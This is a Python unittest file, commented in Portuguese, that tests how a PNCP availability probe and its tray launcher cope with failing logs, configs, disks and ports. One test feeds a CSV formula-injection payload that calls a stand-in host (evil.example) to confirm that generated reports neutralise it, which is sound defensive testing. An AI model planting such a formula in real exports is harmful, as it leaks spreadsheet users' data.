"""Testes de robustez: o que acontece quando o ambiente falha (log, config, disco, porta, encerramento).

Cada teste aqui reproduz um defeito encontrado na auditoria de 21/09/2026, com as classes reais e medição falsa
(sem rede). Rodar:  .venv\\Scripts\\python -m unittest discover -s tests -v
"""

import gzip
import importlib.machinery
import importlib.util
import json
import os
import socket
import tempfile
import threading
import time
import unittest
from datetime import datetime, timedelta
from pathlib import Path

from test_sonda import Base, cfg_rodada, core, rel


def esperar(cond, segundos=5.0):
    fim = time.monotonic() + segundos
    while time.monotonic() < fim:
        if cond():
            return True
        time.sleep(0.02)
    return cond()


class Rapida(Base):
    """Sonda com cadência de milissegundos, para exercitar o laço de verdade."""

    def sonda_rapida(self, **script):
        s = self.sonda(**script)
        s.cfg["intervalo_normal_s"] = s.cfg["intervalo_incidente_s"] = s.proximo_esperado_s = 0.05
        return s

    def rodar(self, s):
        t = threading.Thread(target=s.laco, daemon=True)
        s.thread_laco = t
        t.start()
        self._laços.append((s, t))
        return t

    def setUp(self):
        super().setUp()
        self._laços = []

    def tearDown(self):  # os laços têm de parar ANTES de a pasta temporária ser apagada (Windows não apaga arquivo aberto)
        for s, t in self._laços:
            s.parar.set()
            s.disparar.set()
            t.join(3)
        super().tearDown()


class TestLacoSobrevive(Rapida):
    def test_log_que_falha_no_meio_nao_mata_o_laco_e_ele_volta_quando_o_disco_volta(self):
        s = self.sonda_rapida()
        original, estado = s.log.escrever, {"quebra": False}

        def escrever(rec):
            if estado["quebra"]:
                raise OSError(28, "No space left on device")
            return original(rec)
        s.log.escrever = escrever
        t = self.rodar(s)
        self.assertTrue(esperar(lambda: s.n_rodada >= 2))
        estado["quebra"] = True
        time.sleep(0.4)
        self.assertTrue(t.is_alive(), "o laço morreu quando o log falhou")
        self.assertTrue((self.pasta / "logs" / "sonda-erros.log").exists())  # o erro chegou ao arquivo de emergência
        estado["quebra"] = False
        antes = s.n_rodada
        self.assertTrue(esperar(lambda: s.n_rodada > antes + 1), "o laço não voltou a medir")

    def test_intervalo_em_texto_nao_mata_o_laco(self):
        s = self.sonda_rapida()
        s.cfg["intervalo_normal_s"] = s.cfg["intervalo_incidente_s"] = "0.05"  # config à mão, sem passar pela validação
        t = self.rodar(s)
        self.assertTrue(esperar(lambda: s.n_rodada >= 3))
        self.assertTrue(t.is_alive())

    def test_registrar_erro_nunca_levanta_e_escreve_o_arquivo_de_erros_primeiro(self):
        s = self.sonda()

        def quebra(rec):
            raise OSError("log travado")
        s.log.escrever = quebra
        s.registrar_erro(ValueError("boom"))  # não pode levantar
        texto = (self.pasta / "logs" / "sonda-erros.log").read_text(encoding="utf-8")
        self.assertIn("ValueError: boom", texto)

    def test_encerrar_para_a_sonda_mesmo_com_o_log_falhando(self):
        s = self.sonda()
        s.log.escrever = lambda rec: (_ for _ in ()).throw(OSError(28, "disco cheio"))
        s.encerrar("menu")
        self.assertTrue(s.parar.is_set())

    def test_icone_que_falha_ao_redesenhar_nao_desfaz_a_rodada_nem_a_cadencia(self):
        s = self.sonda(portal=["503", "503", "503", "503"])
        s.ao_mudar = lambda: (_ for _ in ()).throw(RuntimeError("ícone"))
        rec = s.rodada()
        self.assertEqual((rec["estado"], rec["proxima_em_s"]), ("falha", 60))  # cadência do incidente mantida
        self.assertTrue([e for e in self.registros("evento") if e["evento"] == "erro_interno"])

    def test_notificador_que_levanta_nao_perde_a_rodada_nem_a_cor(self):
        s = self.sonda(portal=["503"] * 8)
        s.notificar = lambda t, m: (_ for _ in ()).throw(RuntimeError("winotify quebrou"))
        s.rodada()
        s.rodada()  # 2ª falha seguida: vermelho, e tenta notificar
        self.assertEqual((s.cor, len(self.registros("rodada"))), ("vermelho", 2))

    def test_um_alvo_com_erro_interno_nao_derruba_a_rodada_e_nunca_vira_ok(self):
        s = self.sonda()
        ok = s.medir

        def medir(a, cfg):
            if a["id"] == "portal":
                raise KeyError("nope")
            return ok(a, cfg)
        s.medir = medir
        for _ in range(3):
            rec = s.rodada()
        self.assertEqual(rec["estado"], "degradado")  # alvo não medido: nunca "ok"
        self.assertEqual(rec["alvos"], {"api": "ok"})
        erros = [e for e in self.registros("evento") if e["evento"] == "erro_interno"]
        self.assertEqual(len(erros), 1)  # avisa uma vez, não a cada rodada

    def test_curl_ausente_avisa_uma_vez_em_vez_de_parecer_so_sem_rede(self):
        s = self.sonda(c1=["rede"], c2=["rede"])
        original = s.medir

        def sem_curl(a, cfg):
            m = original(a, cfg)
            m.update(curl_exit=-2, http=0, _corpo=b"", curl_erro="[WinError 2] curl.exe nao encontrado")
            return m
        s.medir = sem_curl
        s.rodada()
        s.rodada()
        erros = [e for e in self.registros("evento") if e["evento"] == "erro_interno"]
        self.assertEqual(len(erros), 1)
        self.assertIn("curl.exe indisponível", erros[0]["erro"])
        self.assertEqual(self.avisos.count("Sonda PNCP: curl.exe indisponível"), 1)

    def test_medicao_em_andamento_no_encerramento_e_descartada(self):
        s = self.sonda()
        original = s.medir

        def medir(a, cfg):
            s.encerrar("menu")  # o usuário encerra enquanto o curl ainda está rodando
            return original(a, cfg)
        s.medir = medir
        self.assertIsNone(s.rodada())
        self.assertEqual([r for r in self.registros() if r["tipo"] in ("sonda", "rodada")], [])
        ultimo = core.ultimo_registro(self.pasta)
        self.assertEqual(ultimo["evento"], "sonda_encerrada")  # nada foi gravado depois do encerramento


class TestVigia(Base):
    def test_saude(self):
        s = self.sonda()
        self.assertIsNone(s.saude())  # sem thread registrada (ainda não subiu)
        morta = threading.Thread(target=lambda: None)
        morta.start()
        morta.join()
        s.thread_laco = morta
        self.assertEqual(s.saude(), "morta")
        s.pausada = True
        self.assertIsNone(s.saude())  # pausada não é problema
        s.pausada = False
        viva = threading.Event()
        t = threading.Thread(target=viva.wait, daemon=True)
        t.start()
        self.addCleanup(viva.set)
        s.thread_laco = t
        self.assertIsNone(s.saude())
        self.relogio.avancar(hours=1)
        s.batimento = s.agora() - timedelta(hours=1)
        s._bat_mono -= 3600
        self.assertEqual(s.saude(), "parada")

    def test_voltar_de_suspensao_nao_e_laco_parado(self):
        """O relógio de parede salta horas na suspensão; o monotônico não. Só acusa se os dois estiverem vencidos."""
        s = self.sonda()
        viva = threading.Event()
        t = threading.Thread(target=viva.wait, daemon=True)
        t.start()
        self.addCleanup(viva.set)
        s.thread_laco = t
        s.batimento = s.agora() - timedelta(hours=5)  # só o de parede está velho
        self.assertIsNone(s.saude())

    def test_tooltip_e_texto_mostram_o_alarme(self):
        s = self.sonda()
        s.alerta = "morta"
        self.assertIn("PAROU", s.tooltip())
        self.assertIn("PARADA", s.texto_status())


class TestConfigValidada(Base):
    def gravar(self, obj):
        (self.pasta / "config.json").write_text(obj if isinstance(obj, str) else json.dumps(obj), encoding="utf-8")

    def recusa(self, obj, trecho):
        self.gravar(obj)
        with self.assertRaisesRegex(ValueError, trecho):
            core.carregar_config(self.pasta)

    def test_recusa_valor_perigoso_ou_do_tipo_errado(self):
        self.recusa({"intervalo_normal_s": "300"}, "intervalo_normal_s")
        self.recusa({"intervalo_normal_s": 0}, "intervalo_normal_s")  # martelaria o PNCP
        self.recusa({"intervalo_incidente_s": -5}, "intervalo_incidente_s")
        self.recusa({"timeout_total_s": True}, "timeout_total_s")
        self.recusa({"porta_instancia": 70000}, "porta_instancia")
        self.recusa({"notificar": "sim"}, "notificar")
        self.recusa({"user_agent": ""}, "user_agent")

    def test_recusa_alvos_invalidos(self):
        base = {"id": "x", "nome": "X", "tipo": "api", "validar": "json_data", "url": "http://exemplo.invalid/"}
        self.recusa({"alvos": []}, "ao menos 1 alvo")
        self.recusa({"alvos": [{**base, "tipo": "controle"}]}, "ao menos 1 alvo")  # só controles = "ok" sem medir
        self.recusa({"alvos": [{**base, "url": ""}]}, "url")
        self.recusa({"alvos": [{**base, "tipo": "banana"}]}, "tipo")
        self.recusa({"alvos": [base, base]}, "repetido")
        self.recusa({"alvos": [{**base, "url": "http://x/{nope}"}]}, "marcador inválido")
        self.recusa({"alvos": [{**base, "limiar_lento_ms": 0}]}, "limiar_lento_ms")
        self.recusa({"alvos": [base, "texto"]}, "objeto")

    def test_recusa_arquivo_ilegivel_com_mensagem_que_cita_o_config(self):
        self.recusa('{"intervalo_normal_s": 3', "config.json ilegível")  # queda no meio da gravação
        self.recusa("[]", "objeto JSON")
        self.recusa("null", "objeto JSON")

    def test_chave_com_erro_de_digitacao_nao_passa_calada(self):
        self.gravar({"intervalo_normal": 120})  # faltou o _s
        cfg = core.carregar_config(self.pasta)
        self.assertEqual(cfg["intervalo_normal_s"], 300)  # ignorada, mas...
        self.assertIn("intervalo_normal", (self.pasta / "logs" / "sonda-erros.log").read_text(encoding="utf-8"))

    def test_config_valido_passa_e_padroes_sao_validos(self):
        core.carregar_config(self.pasta)  # cria com os padrões e valida
        self.gravar({"intervalo_normal_s": 120, "notificar": False})
        self.assertEqual(core.carregar_config(self.pasta)["intervalo_normal_s"], 120)

    def test_gravacao_e_atomica(self):
        core.carregar_config(self.pasta)
        antes = (self.pasta / "config.json").read_text(encoding="utf-8")
        original = os.replace

        def cai(src, dst):
            raise OSError("queda no meio")
        os.replace = cai
        try:
            with self.assertRaises(OSError):
                core.salvar_config_chave(self.pasta, "notificar", False)
        finally:
            os.replace = original
        self.assertEqual((self.pasta / "config.json").read_text(encoding="utf-8"), antes)  # o original está intacto
        core.salvar_config_chave(self.pasta, "notificar", False)
        self.assertFalse(json.loads((self.pasta / "config.json").read_text(encoding="utf-8"))["notificar"])
        self.assertFalse((self.pasta / "config.json.tmp").exists())


class TestLogRobusto(Base):
    dia = datetime(2026, 9, 21).date()

    def test_linha_cortada_nao_engole_o_proximo_registro(self):
        log = core.Log(self.pasta)
        log.escrever({"ts_local": "2026-09-21T10:00:00-03:00", "tipo": "evento", "i": 1})
        with open(self.pasta / "logs" / "sonda-2026-09-21.jsonl", "a", encoding="utf-8") as f:
            f.write('{"ts_local":"2026-09-21T10:00:02-03:00","tipo":"even')  # queda de energia: sem \n
        log.escrever({"ts_local": "2026-09-21T10:00:03-03:00", "tipo": "evento", "i": 4})
        rejeitadas = []
        lidos = [r["i"] for r in core.ler_registros(self.pasta, self.dia, self.dia, rejeitadas)]
        self.assertEqual(lidos, [1, 4])  # o 4 sobrevive; só a linha cortada se perde
        self.assertEqual(len(rejeitadas), 1)  # e o relatório sabe que houve 1 linha ilegível

    def test_leitura_tolera_bytes_invalidos_e_json_que_nao_e_registro(self):
        (self.pasta / "logs").mkdir()
        conteudo = (b'{"tipo":"evento","ts_local":"2026-09-21T10:00:00-03:00","i":1}\n'
                    b'\xff\xfe lixo\n123\n[1,2]\n{"sem_tipo":1}\n'
                    b'{"tipo":"evento","ts_local":"2026-09-21T10:00:05-03:00","i":2}\n')
        (self.pasta / "logs" / "sonda-2026-09-21.jsonl").write_bytes(conteudo)
        rejeitadas = []
        self.assertEqual([r["i"] for r in core.ler_registros(self.pasta, self.dia, self.dia, rejeitadas)], [1, 2])
        self.assertEqual(len(rejeitadas), 4)

    def test_gz_truncado_nao_derruba_a_leitura(self):
        (self.pasta / "logs").mkdir()
        bom = gzip.compress(b'{"tipo":"evento","ts_local":"2026-09-21T10:00:00-03:00","i":1}\n' * 50)
        (self.pasta / "logs" / "sonda-2026-09-21.jsonl.gz").write_bytes(bom[: len(bom) // 2])
        rejeitadas = []
        list(core.ler_registros(self.pasta, self.dia, self.dia, rejeitadas))  # não levanta
        self.assertTrue(rejeitadas)

    def test_jsonl_e_gz_do_mesmo_dia_nao_contam_em_dobro(self):
        (self.pasta / "logs").mkdir()
        linha = b'{"tipo":"evento","ts_local":"2026-09-21T10:00:00-03:00","i":1}\n'
        (self.pasta / "logs" / "sonda-2026-09-21.jsonl").write_bytes(linha)
        (self.pasta / "logs" / "sonda-2026-09-21.jsonl.gz").write_bytes(gzip.compress(linha))
        self.assertEqual(len(list(core.ler_registros(self.pasta, self.dia, self.dia))), 1)

    def test_ultimo_registro_e_o_de_maior_horario_nao_o_ultimo_do_arquivo(self):
        log = core.Log(self.pasta)
        log.escrever({"ts_local": "2026-09-21T10:05:00.000-03:00", "ts_utc": "2026-09-21T13:05:00.000Z", "tipo": "sonda"})
        # o resumo da rodada é gravado depois, mas com o horário do INÍCIO da rodada
        log.escrever({"ts_local": "2026-09-21T10:00:00.000-03:00", "ts_utc": "2026-09-21T13:00:00.000Z", "tipo": "rodada"})
        self.assertEqual(core.ultimo_registro(self.pasta)["tipo"], "sonda")

    def test_compactar_com_arquivo_travado_nao_levanta_e_tenta_de_novo_depois(self):
        (self.pasta / "logs").mkdir()
        arq = self.pasta / "logs" / "sonda-2020-01-01.jsonl"
        arq.write_text('{"tipo":"evento","ts_local":"2020-01-01T10:00:00-03:00"}\n', encoding="utf-8")
        original = Path.unlink

        def negado(self, *a, **k):
            if self.name.endswith(".jsonl"):
                raise PermissionError(13, "em uso por outro processo")
            return original(self, *a, **k)
        Path.unlink = negado
        try:
            self.assertEqual(core.compactar_antigos(self.pasta, 30), 0)  # não levanta
        finally:
            Path.unlink = original
        self.assertTrue(arq.exists())
        self.assertEqual(core.compactar_antigos(self.pasta, 30), 1)  # liberado: agora compacta
        self.assertEqual(len(list(core.ler_registros(self.pasta, datetime(2020, 1, 1).date(),
                                                     datetime(2020, 1, 1).date()))), 1)  # e o dia não fica em dobro

    def test_iniciar_nao_levanta_se_um_acessorio_da_partida_falhar(self):
        s = self.sonda()
        original = core.compactar_antigos
        core.compactar_antigos = lambda *a, **k: (_ for _ in ()).throw(PermissionError(13, "travado"))
        try:
            s.iniciar()  # antes levantava, e a bandeja nunca subia o laço
        finally:
            core.compactar_antigos = original
        self.assertTrue([e for e in self.registros("evento") if e["evento"] == "erro_interno"])


class TestRelatorioRobusto(Base):
    def gravar_falhas(self, corpo, n=6):
        agora = datetime.now(core.UTC).replace(microsecond=0)
        (self.pasta / "logs").mkdir(exist_ok=True)
        linhas = []
        for i in range(n):
            t = agora - timedelta(minutes=5 * (n - i))
            b = {"ts_local": t.astimezone().isoformat(timespec="milliseconds"),
                 "ts_utc": t.isoformat().replace("+00:00", "Z")}
            linhas.append({"tipo": "sonda", **b, "rodada": f"r{i}", "alvo": "api_contratos", "categoria": "api", "url": "x",
                           "tentativa": 1, "resultado": "erro_http", "detalhe": "http_503", "http": 503, "curl_erro": "",
                           "ip": "1.1.1.1", "dns_ms": 1, "tcp_ms": 1, "tls_ms": 1, "ttfb_ms": 5, "total_ms": 100,
                           "corpo_trecho": corpo, "pncp_ts_erro": corpo})
            linhas.append({"tipo": "rodada", **b, "rodada": f"r{i}", "estado": "falha", "cor": "vermelho",
                           "alvos": {"api_contratos": "erro_http"}, "falhas": ["api_contratos"], "duracao_ms": 1000,
                           "modo": "normal", "streak_falha": 1, "proxima_em_s": 300, "rede_local_ok": True, "blips": [],
                           "lentos": [], "bloqueios_429": [], "registros_ausentes": []})
        arq = self.pasta / "logs" / f"sonda-{agora.astimezone():%Y-%m-%d}.jsonl"
        arq.write_text("\n".join(json.dumps(x) for x in linhas) + "\n", encoding="utf-8")
        return agora

    def test_csv_nao_carrega_formula_do_corpo_da_resposta(self):
        self.gravar_falhas('=HYPERLINK("http://evil.example/?"&A1,"x")')
        out = rel.gerar_relatorio(self.pasta, 1)
        celulas = []
        for arq in out.glob("*.csv"):
            for linha in arq.read_text(encoding="utf-8-sig").splitlines():
                celulas += [c for c in linha.split(";") if c and c[0] in "=+-@"]
        self.assertEqual(celulas, [], "há célula de CSV que o Excel executaria como fórmula")
        self.assertIn("'=HYPERLINK", (out / "3_ocorrencias.csv").read_text(encoding="utf-8-sig"))

    def test_cobertura_comeca_no_primeiro_registro(self):
        agora = self.gravar_falhas("x")
        out = rel.gerar_relatorio(self.pasta, 7)
        linhas = (out / "4_cobertura_diaria.csv").read_text(encoding="utf-8-sig").splitlines()[1:]
        self.assertEqual(len(linhas), 1)  # não inventa "cobertura 0%" para os 6 dias em que a sonda não existia
        self.assertTrue(linhas[0].startswith(agora.astimezone().strftime("%d/%m/%Y")))

    def test_relatorio_avisa_quantas_linhas_do_log_estavam_ilegiveis(self):
        self.gravar_falhas("x")
        arq = next((self.pasta / "logs").glob("sonda-*.jsonl"))
        with open(arq, "ab") as f:
            f.write(b"\xff\xfe nao e json\n")
        html_ = (rel.gerar_relatorio(self.pasta, 1) / "resumo_para_chamado.html").read_text(encoding="utf-8")
        self.assertIn("1 linha(s) do log estavam ilegíveis", html_)

    def test_relatorio_e_publicado_por_inteiro_e_sem_sobras(self):
        self.gravar_falhas("x")
        out = rel.gerar_relatorio(self.pasta, 1)
        pai = out.parent
        self.assertEqual(sorted(p.name for p in pai.iterdir()), [out.name])  # sem .novo nem .velha
        self.assertEqual(len(list(out.iterdir())), 6)

    def test_pasta_do_dia_travada_gera_outra_completa_em_vez_de_misturar(self):
        self.gravar_falhas("x")
        primeiro = rel.gerar_relatorio(self.pasta, 1)
        marca = primeiro / "3_ocorrencias.csv"
        antes = marca.read_bytes()
        original = os.replace

        def travada(src, dst):
            if Path(src).name.startswith("relatorio-") and not str(src).endswith(".novo") and Path(dst).name.endswith(".velha"):
                raise PermissionError(5, "Acesso negado (arquivo aberto no Excel)")
            return original(src, dst)
        os.replace = travada
        try:
            segundo = rel.gerar_relatorio(self.pasta, 1)
        finally:
            os.replace = original
        self.assertNotEqual(segundo, primeiro)  # fica numa pasta com a hora no nome
        self.assertEqual(len(list(segundo.iterdir())), 6)  # completa
        self.assertEqual(marca.read_bytes(), antes)  # e a do dia ficou intacta
        self.assertEqual(sorted(p.name for p in primeiro.parent.iterdir() if p.name.endswith((".novo", ".velha"))), [])

    def test_grafico_fino_tem_uma_barra_por_medicao_sem_buracos_falsos(self):
        agora = datetime.now(core.UTC).replace(microsecond=0)
        # medições a cada 336 s (5,6 min): com baldes de 300 s, ~1 em cada 15 ficaria "vazio" sem motivo
        sondas = [{"alvo": "portal", "tentativa": 1, "resultado": "ok", "total_ms": 300,
                   "ts_utc": (agora + timedelta(seconds=336 * i)).isoformat().replace("+00:00", "Z")} for i in range(120)]
        alvos = [{"id": "portal", "nome": "Portal", "tipo": "portal"}]
        html_ = rel._grafico(sondas, alvos, cfg_rodada())
        self.assertEqual(html_.count("<rect x="), 120 + 0)  # exatamente uma barra por medição (a legenda usa <rect w=)
        self.assertIn("1 barra = 1 medição", html_)

    def test_registro_ausente_tem_cor_propria_e_nao_entra_na_latencia(self):
        self.assertEqual(rel._cor_da_medicao("registro_ausente"), "ausente")
        b = rel._baldes([(0, "registro_ausente", 180)], 0, 300, 30)
        self.assertEqual(b[0][0], "ausente")
        b = rel._baldes([(0, "registro_ausente", 9000), (1, "ok", 500)], 0, 300, 30)
        self.assertEqual(b[0][1], 0.5)  # só a resposta válida conta na latência


class TestDesvioEIp(Base):
    def test_desvio_do_relogio_so_com_resposta_rapida(self):
        s = self.sonda(api=["lento"])
        s.rodada()
        por_alvo = {r["alvo"]: r for r in self.registros("sonda")}
        self.assertIn("desvio_relogio_s", por_alvo["portal"])  # 150 ms
        self.assertNotIn("desvio_relogio_s", por_alvo["api"])  # 6 s: o erro da estimativa seria de ±3 s

    def test_controles_que_trocam_de_ip_nao_geram_evento(self):
        s = self.sonda()
        s.rodada()
        s.ips["c1"] = "9.9.9.9"  # o controle "mudou" de IP (balanceamento)
        s.rodada()
        self.assertEqual([e for e in self.registros("evento") if e["evento"] == "mudanca_ip"], [])


# ───────────────────────── bandeja (sonda_pncp.pyw) ─────────────────────────

def carregar_bandeja():
    raiz = Path(__file__).resolve().parents[1]
    loader = importlib.machinery.SourceFileLoader("sonda_pncp_bandeja", str(raiz / "sonda_pncp.pyw"))
    spec = importlib.util.spec_from_loader("sonda_pncp_bandeja", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


def porta_livre():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class TestBandeja(unittest.TestCase):
    def setUp(self):
        self.mod = carregar_bandeja()
        self._tmp = tempfile.TemporaryDirectory()
        self.pasta = Path(self._tmp.name)
        self.mod.RAIZ = self.pasta
        self.caixas = []
        self.mod._caixa = lambda titulo, texto: self.caixas.append(texto)

    def tearDown(self):
        self._tmp.cleanup()

    def servir_como_sonda(self, srv):
        parar, encerrado = threading.Event(), threading.Event()
        t = threading.Thread(target=self.mod.atender, args=(srv, parar, encerrado.set), daemon=True)
        t.start()
        self.addCleanup(lambda: (parar.set(), t.join(3), srv.close()))
        return encerrado

    def test_instancia_unica(self):
        porta = porta_livre()
        primeira = self.mod._tomar_instancia(porta)
        self.assertIsNotNone(primeira)
        self.addCleanup(primeira.close)
        self.assertIsNone(self.mod._tomar_instancia(porta))  # a segunda não consegue

    def test_ping_reconhece_uma_sonda_e_rejeita_outro_programa(self):
        porta = porta_livre()
        srv = self.mod._tomar_instancia(porta)
        self.servir_como_sonda(srv)
        self.assertTrue(self.mod._pingar(porta, tentativas=1, timeout=1))
        # um programa qualquer na porta: aceita a conexão e não responde nada
        outra = porta_livre()
        estranho = socket.socket()
        estranho.bind(("127.0.0.1", outra))
        estranho.listen(2)
        self.addCleanup(estranho.close)
        self.assertFalse(self.mod._pingar(outra, tentativas=1, timeout=0.3))
        self.assertFalse(self.mod._pingar(porta_livre(), tentativas=1, timeout=0.3))  # e porta sem ninguém

    def test_encerrar_so_vale_com_a_confirmacao_da_sonda(self):
        porta = porta_livre()
        encerrado = self.servir_como_sonda(self.mod._tomar_instancia(porta))
        self.assertTrue(self.mod._enviar_encerrar(porta, timeout=2))
        self.assertTrue(encerrado.wait(2))
        outra = porta_livre()
        estranho = socket.socket()
        estranho.bind(("127.0.0.1", outra))
        estranho.listen(2)
        self.addCleanup(estranho.close)
        self.assertFalse(self.mod._enviar_encerrar(outra, timeout=0.4))  # antes devolvia True sem efeito nenhum
        self.assertFalse(self.mod._enviar_encerrar(porta_livre(), timeout=0.4))

    def test_porta_ocupada_por_outro_programa_avisa_o_usuario_em_vez_de_sair_calada(self):
        porta = porta_livre()
        cfg = json.loads(json.dumps(core.CONFIG_PADRAO))
        cfg.update(porta_instancia=porta, iniciar_com_windows=False)
        (self.pasta / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
        estranho = socket.socket()
        estranho.bind(("127.0.0.1", porta))
        estranho.listen(2)
        self.addCleanup(estranho.close)
        self.mod._pingar = lambda p, **k: False  # sem esperar os segundos do ping de verdade
        self.assertEqual(self.mod.bandeja(), 1)
        self.assertEqual(len(self.caixas), 1)
        self.assertIn(str(porta), self.caixas[0])
        self.assertIn("sonda-erros.log", os.listdir(self.pasta / "logs"))

    def test_ja_existe_uma_sonda_nao_e_erro(self):
        porta = porta_livre()
        cfg = json.loads(json.dumps(core.CONFIG_PADRAO))
        cfg.update(porta_instancia=porta, iniciar_com_windows=False)
        (self.pasta / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
        self.servir_como_sonda(self.mod._tomar_instancia(porta))
        self.assertEqual(self.mod.bandeja(), 0)  # 2º clique em "Iniciar Sonda PNCP.cmd": sai em silêncio
        self.assertEqual(self.caixas, [])

    def test_config_invalido_avisa_o_usuario_com_o_motivo(self):
        (self.pasta / "config.json").write_text('{"intervalo_normal_s": 0}', encoding="utf-8")
        self.assertEqual(self.mod.bandeja(), 1)
        self.assertIn("intervalo_normal_s", self.caixas[0])

    def test_argumento_desconhecido_ou_invalido_nao_sobe_a_sonda(self):
        for args in (["--ajuda"], ["--relatorios"], ["--relatorio", "0"], ["--relatorio", "999"], ["--relatorio", "abc"],
                     ["--relatorio", "²"]):
            self.assertEqual(self.mod.main(args), 2, args)

    def test_relatorio_com_dias_validos(self):
        self.assertEqual(self.mod.main(["--relatorio", "3"]), 0)
        self.assertTrue(list((self.pasta / "relatorios").glob("relatorio-*")))

    def test_flags_de_linha_de_comando_com_config_invalido_falham_com_mensagem(self):
        (self.pasta / "config.json").write_text("{quebrado", encoding="utf-8")
        for args in (["--encerrar"], ["--uma-rodada"], ["--relatorio", "2"]):
            self.assertEqual(self.mod.main(args), 1, args)

    def test_atender_sobrevive_a_erro_no_accept(self):
        class Quebrado:
            n = 0

            def settimeout(self, t):
                pass

            def accept(self):
                Quebrado.n += 1
                if Quebrado.n < 3:
                    raise OSError(10053, "conexão abortada")
                raise TimeoutError

        parar = threading.Event()
        t = threading.Thread(target=self.mod.atender, args=(Quebrado(), parar, lambda: None), daemon=True)
        t.start()
        self.assertTrue(esperar(lambda: Quebrado.n >= 4))  # continuou tentando depois dos erros
        self.assertTrue(t.is_alive())
        parar.set()
        t.join(3)


if __name__ == "__main__":
    unittest.main()
